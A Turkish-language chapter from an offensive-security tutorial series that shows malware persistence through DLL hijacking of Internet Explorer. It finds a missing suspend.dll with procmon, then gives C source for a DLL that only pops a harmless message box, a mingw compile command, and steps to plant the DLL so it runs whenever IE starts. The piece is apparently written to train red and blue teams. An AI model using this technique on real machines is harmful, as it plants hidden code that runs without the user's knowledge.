\newpage
\subsection{81. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 15. Internet Explorer. Basit C++ örneği.}

﷽


![pers](./images/75/2022-10-13_00-24_1.png){width="80%"}    

Bu gönderi, Internet Explorer aracılığıyla kötü amaçlı yazılım kalıcılığına dair ilginç bir teknik üzerine kendi araştırmamın sonucudur.    

### internet explorer

[Önceki](https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html) gönderilerimden birinde, DLL kaçırmanın gerçek dünya örneğinden bahsetmiştim. Bu sefer kurban Internet Explorer. Eminim çoğunuz onu kullanmıyorsunuzdur ve Windows sisteminden kasıtlı olarak silmeniz pek olası değildir.    

### pratik örnek

Önceki gönderimde olduğu gibi, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)'u çalıştırıp aşağıdaki filtreleri ayarlayalım:    

![pers](./images/75/2022-10-13_00-03.png){width="80%"}    

Ardından `Internet Explorer`'ı çalıştırın:     

![pers](./images/75/2022-10-13_00-04.png){width="80%"}    

![pers](./images/75/2022-10-13_00-04_1.png){width="80%"}    

Gördüğünüz gibi, `iexplore.exe` süreci eksik birkaç DLL içeriyor ve bunlar muhtemelen DLL kaçırma için kullanılabilir. Örneğin `suspend.dll`:     

![pers](./images/75/2022-10-13_00-05.png){width="80%"}    

Hadi başka olası konumları arayalım, belki elimizde geçerli bir DLL vardır:    

```powershell
cd C:\
dir /b /s suspend.dll
```

![pers](./images/75/2022-10-13_00-09.png){width="80%"}    

Ancak gördüğünüz gibi, dosya bulunamadı, yani bu DLL yalnızca Internet Explorer tarafından kullanılıyor.    

Daha sonra "kötü" DLL'imi hazırladım, `meow-woof` mesaj kutusu:        

```cpp
/*
evil.c - malicious DLL
DLL hijacking. Internet Explorer
author: @cocomelonc
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, 
LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      MessageBox(
        NULL,
        "Meow-woof!",
        "=^..^=",
        MB_OK
      );
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}
```

### demo

Hadi her şeyi çalışırken görelim. Kötü amaçlı DLL’imizi derleyelim:    

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

![pers](./images/75/2022-10-13_00-12.png){width="80%"}    

Daha sonra dosyayı `suspend.dll` olarak adlandırıp Internet Explorer’ın yüklendiği dizine yerleştiriyorum:     

![pers](./images/75/2022-10-13_06-13.png){width="80%"}    

![pers](./images/75/2022-10-13_00-15.png){width="80%"}    

Ve son olarak kurban uygulamamızı çalıştırmayı deniyoruz:     

![pers](./images/75/2022-10-13_00-16_1.png){width="80%"}    

![pers](./images/75/2022-10-13_00-18.png){width="80%"}    

![pers](./images/75/2022-10-13_00-24.png){width="80%"}    

Pop-up'ı kapattıktan sonra IE düzgün çalışıyor, çökmedi:    

![pers](./images/75/2022-10-13_00-16.png){width="80%"}    

Gördüğünüz gibi çalıştı. Mükemmel! =^..^=     

### sonuç

Şimdi IE üzerinden kalıcılığı başardık.    

Bu yüzden bu gönderi kalıcılık kategorisine giriyor; kötü amaçlı DLL’imiz, kullanıcı IE’yi her başlattığında çalışacak. Ve kapattıklarında da. Windows severler için sürpriz! Herhangi bir şey yüklemenize veya kaldırmanıza bile gerek yok.    

Bu yöntem `Windows 11 x64` üzerinde de çalışıyor:    

![pers](./images/75/2022-10-13_06-37.png){width="80%"}    

Her ne kadar 2022 yılında birinin IE’yi çalıştırması pek olası olmasa da, katılır mısınız?   

Bir Windows hata avcısı olarak, işletim sisteminde ayrıcalık yükseltme açıklarını bulmak istiyorsanız, genellikle temiz bir Windows kurulumu ile boş bir sayfadan başlamak istersiniz.    

APT gruplarından herhangi birinin bu taktiği ve hileyi kullanıp kullanmadığını bilmiyorum, ancak umarım bu gönderi, yazılım geliştirirken özellikle mavi takım üyelerinin farkındalığını artırır ve kırmızı takım üyeleri için bir silah ekler.    

[DLL hijacking](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)     
[DLL hijacking with exported functions](https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-10-12-malware-pers-15)     
